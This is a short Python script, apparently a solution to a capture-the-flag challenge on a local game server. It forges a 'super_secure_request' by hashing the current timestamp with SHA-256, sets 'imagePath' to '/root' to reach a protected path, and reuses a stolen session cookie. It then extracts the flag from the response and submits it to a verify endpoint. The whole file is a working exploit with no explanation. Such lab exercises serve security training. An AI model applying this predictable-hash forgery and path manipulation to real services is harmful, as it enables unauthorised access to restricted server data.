import time
import requests
from hashlib import sha256

cookies = {"user": "cb29fa16-c565-4f55-82a6-6d11f02b6488"} # Cookie taken from the website under my user

curr_time = int(time.time())
hashed_time = str(curr_time).encode('utf-8')
payload = {
    'time': str(curr_time),
    'hash': sha256(hashed_time).hexdigest(),
    "imagePath": "/root"
}

headers = {
    'Content-Type': 'application/json'
}

response = requests.post("http://127.0.0.1:8000/games/random_text/super_secure_request", headers=headers, json=payload, cookies=cookies)

print(response.text)
flag = response.text.split(" ")[-1][:-1]

payload = {
    "flag": flag
}

print(flag)
response = requests.post("http://127.0.0.1:8000/games/random_text/verify", headers=headers, json=payload, cookies=cookies)

print(response)
print(response, response.text)